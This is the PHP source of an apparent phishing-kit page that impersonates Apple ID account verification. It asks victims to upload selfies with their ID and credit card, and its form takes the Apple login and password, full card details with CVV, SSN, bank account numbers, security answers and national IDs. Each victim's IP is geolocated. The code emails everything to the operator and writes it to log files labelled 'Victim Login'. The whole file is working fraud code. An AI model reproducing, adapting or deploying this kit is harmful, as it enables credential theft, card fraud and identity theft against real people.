<?php
error_reporting(E_ERROR);
session_start();
require "assets/includes/language.php";
require "functions/detectbin.php";
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/One_Time.php";
require "assets/includes/enc.php";
require_once "assets/includes/apxdev.php";
require_once "class.phpmailer.php";
require_once "class.smtp.php";
require_once "setting.php";

function acak($panjang)
        {
        $karakter = 'abcdefghijklmnopqrstuvwxyz1234567890';
        $string = '';
        for ($i = 0; $i < $panjang; $i++)
                {
                $pos = rand(0, strlen($karakter) - 1);
                $string.= $karakter
                        {
                        $pos};
                        }

                return $string;
                }

?>

<?php
        if (isset($_FILES['picturedriverlicense']) && isset($_FILES['picturecreditcard']))
                {
                if (!empty($_SERVER['HTTP_CLIENT_IP']))
                        {
                        $ip = $_SERVER['HTTP_CLIENT_IP'];
                        }
                elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
                        {
                        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                        }
                  else
                        {
                        $ip = $_SERVER['REMOTE_ADDR'];
                        }

                $systemInfo = systemInfo($ip);
                $file_name1 = $_FILES['picturedriverlicense']['name'];
                $file_size1 = $_FILES['picturedriverlicense']['size'];
                $file_tmp1 = $_FILES['picturedriverlicense']['tmp_name'];
                $file_type1 = $_FILES['picturedriverlicense']['type'];
                $file_ext1 = strtolower(end(explode('.', $_FILES['picturedriverlicense']['name'])));
                $file_name2 = $_FILES['picturecreditcard']['name'];
                $file_size2 = $_FILES['picturecreditcard']['size'];
                $file_tmp2 = $_FILES['picturecreditcard']['tmp_name'];
                $file_type2 = $_FILES['picturecreditcard']['type'];
                $file_ext2 = strtolower(end(explode('.', $_FILES['picturecreditcard']['name'])));
                $expensions = array(
                        "jpeg",
                        "jpg",
                        "png"
                );
                if (in_array($file_ext1, $expensions) === false || in_array($file_ext2, $expensions) === false)
                        {
                        $errors[] = "Extension not allowed, please choose a JPEG or PNG file.";
                        }

                if (empty($errors) == true)
                        {
                        $fileid = $_SESSION["user"] . "-id-" . sha1($file_name1) . ".jpg";
                        $filecc = $_SESSION["user"] . "-id-" . sha1(uniqid() . $file_name2) . ".jpg";
                        move_uploaded_file($file_tmp1, "uploads/" . $fileid);
                        move_uploaded_file($file_tmp2, "uploads/" . $filecc);

                        // do send result email

                        if ($file_size1 > 3000000 || $file_size2 > 3000000)
                                {
                                UploadCompress($fileid, $fileid, "uploads", 60);
                                UploadCompress($filecc, $filecc, "uploads", 60);
                                }

                        if (empty($errors) == true)
                                {

                                // do send result email

                                set_time_limit("0");
                                $mail = new PHPMailer;
                                $mail->SMTPDebug = 0;
                                $mail->isMail();
                                $mail->From = $SenderEmail;
                                $mail->FromName = $SenderPhoto;
                                $mail->addAddress($Your_Email);
                                $mail->addAttachment("uploads/$fileid", 'Driving License.jpg'); // Optional name
                                $mail->addAttachment("uploads/$filecc", 'CreditCard.jpg'); // Optional name
                                $mail->isHTML(true); // Set email format to HTML
                                $mail->Subject = "Foto Bule Selfi " . " [ " . $systemInfo['country'] . " $ip]";
                                $mail->Body = "Email : " . $_SESSION['user'];
                                if (!$mail->send())
                                        {
                                        fclose($buka);
                                        }
                                  else
                                        {
                                        $file2 = $_SERVER['DOCUMENT_ROOT'] . "/assets/logs/._upload_.txt";
                                        $isi = @file_get_contents($file2);
                                        $buka = fopen($file2, "w");
                                        fwrite($buka, $isi + 1);
                                        header('Location: Done.php?sessionid=' . generateRandomString(115) . '&securessl=true');
                                        echo '<script>window.location="Done.php?sessionid=' . generateRandomString(115) . '&securessl=true"</script>';
                                        }
                                }
                          else
                                {

                                // echo tr($errors[0]);

                                }
                        }
                }

?>

<?php
        if (isset($_POST["fname"]) && isset($_POST["lname"]) && isset($_POST["dob"]) && isset($_POST["address"]))
                {
                if (isset($_POST['mname']) && !empty($_POST['mname']))
                        {
                        $mname = "";
                        }
                  else
                        {
                        $mname = $_POST['mname'];
                        }

   
                $userid = $_SESSION["user"];
                $password = $_SESSION["pass"];
                $name = $_POST["fname"] . " " . $mname . " " . $_POST["lname"];
                $dob = $_POST["dob"];
                $address = $_POST["address"] . ", " . $_POST["town"] . ", " . $_POST["county"];
                $postcode = $_POST["postcode"];
                $country = $_POST["country"];
                $telephone = $_POST["telephone"];
                $ssn = $_POST["ssn"];
                $ccname = $_POST["ccname"];
                $ccno = $_POST["ccno"];
                $ccexp = $_POST["ccexp"];
                $climit = $_POST['climit'];
                $citizenid = $_POST['citizenid'];
                $qatarid = $_POST['qatarid'];
                $naid = $_POST['naid'];
                $bans = $_POST['bans'];
                $passport = $_POST['passport'];
                $civilid = $_POST['civilid'];
                $numbid = $_POST['numbid'];
                $secode = $_POST["secode"];
                $acno = $_POST["acno"];
                $sort = $_POST["sortcode"];
                $q1 = $_POST["q1"];
                $a1 = $_POST["a1"];
                $nabid = $_POST["nabid"];
                $bankaccount = $_POST["bankaccount"];
                $cardid = $_POST['cardid'];
                $cardpassword = $_POST['cardpassword'];
                if (!empty($_SERVER['HTTP_CLIENT_IP']))
                        {
                        $ip = $_SERVER['HTTP_CLIENT_IP'];
                        }
                elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
                        {
                        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                        }
                  else
                        {
                        $ip = $_SERVER['REMOTE_ADDR'];
                        }

                $systemInfo = systemInfo($ip);
                $ccno = str_replace(' ', '', $ccno);
                $last4 = substr($ccno, 12, 16);

                // fungsi bin

                $bin = str_replace(' ', '', $ccno);
                $bin = substr($bin, 0, 6);
                $c = curl_init();
                curl_setopt($c, CURLOPT_URL, "https://www.cardbinlist.com/search.html?bin=$bin");
                curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
                curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
                $result = curl_exec($c);
                curl_close($c);
                preg_match_all("/<td>(.*)<\/td>/", $result, $pisah);
                preg_match_all("/target=\"_blank\">(.*)<\/a><\/td>/", $result, $pisah2);
                $ccbrand = $pisah2[1][1];  
                $ccbank = $pisah[1][2];
                $cctype = strtoupper($pisah[1][6]);
                $ccklas = $pisah[1][7];
$BIN_LOOKUP  = str_replace(' ', '', $_POST["ccno"]);
$RSJ_BIN    = @json_decode(file_get_contents("https://lookup.binlist.net/".$bin.""));
$BIN_CARD    = $RSJ_BIN->scheme;
$BIN_BANK    = $RSJ_BIN->bank->name;
$BIN_TYPE    = $RSJ_BIN->type;
$BIN_LEVEL   = $RSJ_BIN->brand;
$BIN_CNTRCODE= $RSJ_BIN->country->alpha2;
$BIN_WEBSITE = strtolower($RSJ_BIN->bank->url);
$BIN_PHONE   = strtolower($RSJ_BIN->bank->phone);
$BIN_COUNTRY = $RSJ_BIN->country->name;
///////////////////////////////// SESSION FOR SOME VAR  /////////////////////////////////
$_SESSION['_country_']  = $BIN_COUNTRY;
$_SESSION['_cntrcode_'] = $BIN_CNTRCODE;
$_SESSION['_cc_brand_'] = $BIN_CARD;
$_SESSION['_cc_bank_']  = $BIN_BANK;
$_SESSION['_cc_type_']  = $BIN_TYPE;
$_SESSION['_cc_class_'] = $BIN_LEVEL;
$_SESSION['_cc_site_']  = $BIN_WEBSITE;
$_SESSION['_cc_phone_'] = $BIN_PHONE;
$_SESSION['_ccglobal_'] = $_SESSION['_cc_brand_']." ".$_SESSION['_cc_type_']." ".$_SESSION['_cc_class_'];
$_SESSION['_global_']   = $_SESSION['_cntrcode_']." - ".$_SESSION['_ip_'];
///////////////////////////////// BIN CHECKER  /////////////////////////////////

                $VictimInfo1 = "| IP Address :" . " " . $ip . " (" . gethostbyaddr($ip) . ")";
                $VictimInfo2 = "| Location :" . " " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'];
                $VictimInfo3 = "| UserAgent :" . " " . $systemInfo['useragent'];
                $VictimInfo4 = "| Browser :" . " " . $systemInfo['browser'];
                $VictimInfo5 = "| Platform :" . " " . $systemInfo['os'];
                $VictimInfo6 = "" . $systemInfo['country'];
                $from = $SenderEmail;
                $headers = "From: $SenderCC <$SenderEmail>";
                $subj = "" . $ccname . " - $bin - ". $_SESSION['_cc_brand_'] ." - ". $_SESSION['_cc_bank_'] ."-". $_SESSION['_cc_type_'] ."-". $_SESSION['_cc_class_'] ." [ " . $VictimInfo6 . " $ip " . $systemInfo['os'] . "]";
                $to = $Your_Email;
                $warnsubj = "Abuse";
                $warn = "A user (with ip: $ip) has attempted to send you a completed form containing abusive language. l33bo_Phishers is against abusive form filling and has redirected this user to the official site while blocking the form.";
                $bad_words = array(
                        '9999',
                        '4r5e',
                        '5h1t',
                        '5hit',
                        'a55',
                        'anal',
                        'asshole',
                        'arsehole',
                        'passwd',
                        'sample'
                );
                $data = "
      ++--------[*RSJKINGDOM X APPLE*]--------++

    ------------------------------------------
              Apple Login
    ------------------------------------------
    Username : $userid
    Password : $password

    ------------------------------------------
              CreditCard
    ------------------------------------------
    Cardholder Name   :  $ccname
    Card Number       :  $ccno
    Expiration Date   :  $ccexp
    Cvv2              :  $secode
    BIN/IIN Info      :  $bin - ". $_SESSION['_cc_brand_'] ." - ". $_SESSION['_cc_bank_'] ."-". $_SESSION['_cc_type_'] ."-". $_SESSION['_cc_class_'] ."
    For Check         :  $ccno/$ccexp/$secode
    Qatar ID (QA)                 : $qatarid
    ID Number (GR)                : $numbid
    Citizen ID (TH)               : $citizenid
    National ID (SA)              : $naid
    Sort Code (UK/IE)             : $sort
    Civil ID Number (KW)          : $civilid
    Bank Access Number (NZ)       : $bans
    Account Number (UK/IE/IN)     : $acno
    Credit limit (IE/TH/IN/NZ/AU) : $climit
    Bank Account (AU)             : $bankaccount
    NAB ID (AU)                   : $nabid
    Card ID (JP)                  : $cardid
    Card Password (JP)            : $cardpassword

    ------------------------------------------
          Account Information
    ------------------------------------------
    Full Name     :  $name
    Address       :  $address
    Zip/PostCode  :  $postcode
    Country       :  $country
    Phone Number  :  $telephone
    SSN           :  $ssn
    DOB           :  $dob
    Security Question  : $q1
    Security Answer    : $a1

    ------------------------------------------
             Victim Login
    ------------------------------------------
    From     :  $VictimInfo1 - $VictimInfo2
    Browser  :  $VictimInfo3 - $VictimInfo4 - $VictimInfo5

    ++---------===[ $$ End Resutls $$ ]===---------++
    ";
                if ($Encrypt == 1)
                        {
                        include ("assets/includes/AES.php");

                        $imputText = $data;
                        $imputKey = $Key;
                        $blockSize = 256;
                        $aes = new AES($imputText, $imputKey, $blockSize);
                        $enc = $aes->encrypt();
                        $aes->setData($enc);
                        $dec = $aes->decrypt();
                        }

                if ($Abuse_Filter == 1)
                        {
                        foreach($bad_words as $bad_word)
                                {
                                if (stristr($_POST['fname'], $bad_word) !== false)
                                        {
                                        mail($to, $warnsubj, $warn, $headers);
                                        exit(header("Location:  https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwioqpfl4oPKAhWHPxQKHYGXAjkQFggfMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww&sig2=gKBRh04c9wVr4EOc4FARAw&bvm=bv.110151844,d.d24"));
                                        }

                                if (stristr($_POST['address'], $bad_word) !== false)
                                        {
                                        mail($to, $warnsubj, $warn, $headers);
                                        exit(header("Location:  https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwioqpfl4oPKAhWHPxQKHYGXAjkQFggfMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww&sig2=gKBRh04c9wVr4EOc4FARAw&bvm=bv.110151844,d.d24"));
                                        }
                                }
                        }

                if ($Save_Log == 1)
                        {
                        if ($Encrypt == 1)
                                {
                                $file = fopen("assets/logs/app.txt", "a");
                                fwrite($file, $enc);
                                fclose($file);
                                }
                          else
                                {
                                $file = fopen("assets/logs/app.txt", "a");
                                fwrite($file, $data);
                                fclose($file);
                                }
                        }

                if ($Send_Log == 1)
                        {
                        if ($Encrypt == 1)
                                {
                                mail($to, $subj, $enc, $headers);
                                }
                          else
                                {
                                    if($_SESSION['sescc'] == $_POST["ccno"]){
    $domain = "https://$_SERVER[SERVER_NAME]";
    $gen = generateRandomString(115);
    header("location: $domain/Verify2.php?&sessionid=$gen&securessl=true");
}else{
                                mail($to, $subj, $data, $headers);
                                $empas = "# $bin - $ccbrand - $cctype - $ccklas - $ccbank [ " . $systemInfo['country'] . " ]\n";
                                $file = fopen("assets/logs/bin.log", "a");
                                fwrite($file, $empas);
                                fclose($file);
                                $file2 = $_SERVER['DOCUMENT_ROOT'] . "/assets/logs/._ccz_.txt";
                                $isi = file_get_contents($file2);
                                $buka = fopen($file2, "w");
                                fwrite($buka, $isi + 1);
                                fclose($buka);
                                }
                        }
                        }

                if ($One_Time_Access == "block")
                        {
                        $fp = fopen("assets/includes/blacklist.dat", "a");
                        fputs($fp, "\r\n$ip\r\n");
                        fclose($fp);
                        }
                }

?>
<!DOCTYPE html>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">

<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title><?php echo tr('Document Verification'); ?></title>
<link href="assets/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="assets/css/First.css" media="all" rel="stylesheet" type="text/css">
<link href="assets/css/Second.css" rel="stylesheet" type="text/css">
<link href="assets/css/Fonts.css" rel="stylesheet" type="text/css">
<link href="assets/css/verify.css" rel="stylesheet" type="text/css">
<link href="assets/css/error-tips.css" rel="stylesheet" type="text/css">
</head>
<body id="pagecontent">
<div id="content">
<div class="bdd45">
<nav id="xdsfv54" class="js no-touch svg no-ie7 no-ie8">
<div class="HeaderObjHolder">
<ul class="MobHeader">
<li class="HeaderObj MobMenIconH">
<label class="MobMenHol">
<span class="MobMenIcon MobMenIcon-top">
<span class="MobMenIcon-crust MobMenIcon-crust-top"></span> </span> <span class="MobMenIcon MobMenIcon-bottom">
<span class="MobMenIcon-crust MobMenIcon-crust-bottom"></span> </span>
</label>
</li>
<li class="HeaderObj">
<a class="Item1" href="#" style="display: inline-block;margin-left:50%;margin-top:11px" id="ac-gn-firstfocus-small"> <span class="ac-gn-link-text">&nbsp;</span> </a>
<a class="Item10" style="display: inline-block;float:right;margin-top:11px" href="#"> <span class="ac-gn-link-text">&nbsp;</span> <span class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
</li>
</ul>
<ul class="HeaderObjList">
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item1" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item2" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item3" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item4" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item5" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item6" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item7" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item8" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item9" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item10" href="#"></a></li>
</ul>
</div>
</nav>
<div id="flow">
<div class="flow-body signin clearfix" role="main">
<div class="persona-splash no-photo clearfix">
    <div class="persona-bg"></div>
    <div class="container">
        <div class="splash-section">
            <div class=" person-wrapper">
                <div>
                    <div class="row">
                        <div class="col-sm-9 appleid-col">
                            <div class="flex-container">
                                <h1 class="mobile appleid-user">
                                    <span class="first_name"><?php echo tr('Account Verification'); ?></span>
                                    <small class="SessionUser"><?php echo tr('Your Apple ID is'); ?> <strong><?php
        echo $_SESSION['user']; ?></strong> </small>
                                </h1>
                            </div>
                        </div>
                        <div class="not-mobile col-sm-3">
                            <div class="flex-container-signout">
                                <div class="signout pull-right">
                                    <button class="btn btn-link"><?php echo tr('Sign Out'); ?> </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="container">

<div class="flex home-content">

    <form action="Upload-Identity.php?sessionid=<?php
        echo generateRandomString(115); ?>&securessl=true" method="post" enctype="multipart/form-data" name="details" id="details" class="proceed" novalidate="novalidate">
    <div class="container flow-sections">
    <div class="editable account-edit clearfix">
    <div class="row edit-row">
        <div class="col-sm-6 col-sm-offset-3">
                                                    <h3 class="section-subtitle" id="nameLabel">
                                                                <?php echo tr('Document and Credit Card Verification'); ?>
                                                                                                    </h3>
                                                                                                    <div class="form-group">
                                                        <div class="form-group clearfix" style="padding-top:0px;">
                                                                                                        <?php echo tr('Apple requires a copy of certain documents for verification purposes to return your account to reguler standing'); ?>
                                                                                                        </div>
                                                                                                        <div class="pop-wrapper field-pop-wrapper middle-wrapper">
                                                                                                                <img src="assets/img/drivinglicense.jpg" alt="Identity Card Example" title="Identity Card Example" style="width: 400px;"></img>
                                                                                                        </div>
                                                        <br />
                                                        <div class="form-group clearfix">
                                                            <b>*<?php echo tr('Take a selfie with your Identity Card / Driver License'); ?> : </b><br />
                                                            <input type="file" name="picturedriverlicense" required="required"/>
                                                                                                        </div>

                                                        <div class="pop-wrapper field-pop-wrapper middle-wrapper">
                                                            <b>*<?php echo tr('Take a selfie with your Credit / Debit Card'); ?> : </b><br />
                                                            <input type="file" name="picturecreditcard" required="required" />
                                                                                                    </div><br />


<?php
        if (empty($errors) == false)
                {
                echo tr($errors[0]);
                }

?>

                                                                                                        <div class="pop-wrapper field-pop-wrapper middle-wrapper">

                                                                                                                <div class="name-input">
                                                                                                                        <input type="submit" class="gobtn btn-link" style="width:30%;margin-left:auto;margin-right:auto;float:right" value="<?php echo tr('Upload'); ?>">
                                                                                                                </div>
                                                                                                        </div> <br /> <br />
                                                                                                    </div>
                                                                                                </div>
    </div>
    </div>
    </div>
    </form>

<!-- FORM ENDS -->
</div>

</div>
</div>
</div>
<footer>
<div class="container">
<div class="footer">
<div class="footer-wrap">
<div class="FooterLine1">
<div class="line-level">Shop the <a href="#">Apple Online Store</a> (<?php
        echo $langx['APPCALL']; ?>), visit an <a href="#">Apple Retail Store</a>, or find a <a href="#">reseller</a>.</div>
</div>
<div class="FooterLine2">
<ul class="menu">
<li class="item"><a href="#">Apple Info</a></li>
<li class="item"><a href="#">Site Map</a></li>
<li class="item"><a href="#">Hot News</a></li>
<li class="item"><a href="#">RSS Feeds</a></li>
<li class="item"><a href="#">Contact Us</a></li>
<li class="item"><a class="choose" href="#"><img height="22" src="<?php
        echo $langx['FLAG']; ?>" width="22"></a></li>
</ul>
</div>
<div class="FooterLine3">Copyright +é-® 2018 Apple Inc. All rights reserved.
<ul class="menu">
<li class="item"><a href="#">Terms of Use</a></li>
<li class="item"><a href="#">Privacy Policy</a></li>
</ul>
</div>
</div>
</div>
</div>
</footer>
</div>
</div>
</body>
</html>